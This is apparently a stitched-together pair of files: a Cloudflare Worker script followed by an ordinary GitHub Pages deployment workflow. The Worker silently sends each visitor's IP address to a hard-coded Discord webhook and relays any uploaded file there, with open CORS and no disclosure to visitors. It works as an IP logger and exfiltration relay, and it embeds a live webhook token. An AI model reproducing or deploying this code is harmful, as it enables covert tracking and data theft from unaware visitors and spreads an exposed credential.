export default {
  async fetch(request, env, ctx) {
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1518254992325349477/b2wiQmkba9SPDPedErCexidD8pBjpbqiySYTrYb6Ivzx1DG57Y-khcLqCt2X_vkF6VgI';
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    try {
      if (request.method === 'GET') {
        const clientIP = request.headers.get('CF-Connecting-IP') || '0.0.0.0';
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: 'IP: ' + clientIP })
        });
        return new Response(JSON.stringify({ ip: clientIP }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      if (request.method === 'POST') {
        const formData = await request.formData();
        const file = formData.get('file');
        const payloadJson = formData.get('payload_json');
        if (file) {
          const newFormData = new FormData();
          newFormData.append('file', file);
          if (payloadJson) newFormData.append('payload_json', payloadJson);
          await fetch(DISCORD_WEBHOOK, { method: 'POST', body: newFormData });
        }
        return new Response('OK', { headers: corsHeaders });
      }

      return new Response('Metodo no permitido', { status: 405, headers: corsHeaders });
    } catch (error) {
      return new Response(JSON.stringify({ error: error.message }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
  }
};
name: Deploy static content to Pages

on:
  # Runs on pushes targeting the default branch
  push:
    branches: ["main"]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
permissions:
  contents: read
  pages: write
  id-token: write

# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
concurrency:
  group: "pages"
  cancel-in-progress: false

jobs:
  # Single deploy job since we're just deploying
  deploy:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Setup Pages
        uses: actions/configure-pages@v5
      - name: Upload artifact
        uses: actions/upload-pages-artifact@v3
        with:
          # Upload entire repository
          path: '.'
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v5
